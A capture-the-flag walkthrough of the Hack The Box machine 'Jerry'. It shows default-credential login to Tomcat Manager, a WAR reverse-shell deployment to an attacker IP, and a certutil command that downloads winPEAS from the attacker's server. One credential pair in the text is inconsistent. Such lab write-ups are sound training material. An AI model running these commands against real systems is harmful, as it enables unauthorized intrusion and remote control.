## Box: Jerry

## Target IP: `10.10.10.95`

---

### Initial Nmap Scan

Ran:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.10.10.95
```

Result:

| Port | Service | Version |
| --- | --- | --- |
| 8080 | http | Apache Tomcat/Coyote JSP engine 1.1 |

HTTP title: Apache Tomcat/7.0.88.

Default Tomcat page on port 8080.

---

### Web Enumeration and Initial Access

Clicked on Manager App link.

Login prompt.

Searched default credentials.

Tried `admin:s3cret`. Success.

Manager interface allows `.war` file uploads.

Searched for `.war` reverse shells. Found:

```bash
https://github.com/thewhiteh4t/warsend
```

Cloned:

```bash
git clone https://github.com/thewhiteh4t/warsend.git
```

Built and launched:

```bash
./warsend.sh 10.10.14.15 4444 10.10.10.95 8080 tomcat s3cret revshell
```

Shell access achieved.

---

### Post-Exploitation

Got a prompt:

```bash
C:\apache-tomcat-7.0.88>
```

Planned privilege escalation with `winPEAS`.

On attacker machine:

```bash
cp /opt/winpeas/winPEASany.exe .
python3 -m http.server 80
```

On victim:

```bash
certutil -urlcache -split -f http://10.10.14.15/winPEASany.exe winpeas.exe
winpeas.exe
```

Before even needing winPEAS, noticed:

Already running as `NT AUTHORITY\SYSTEM`.

Whoops. Surprised I didn't check that first!

---

### Flags

Located:

```bash
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

Contents:

- `user.txt`: `[REDACTED]`
- `root.txt`: `[REDACTED]`

Both flags in one file.
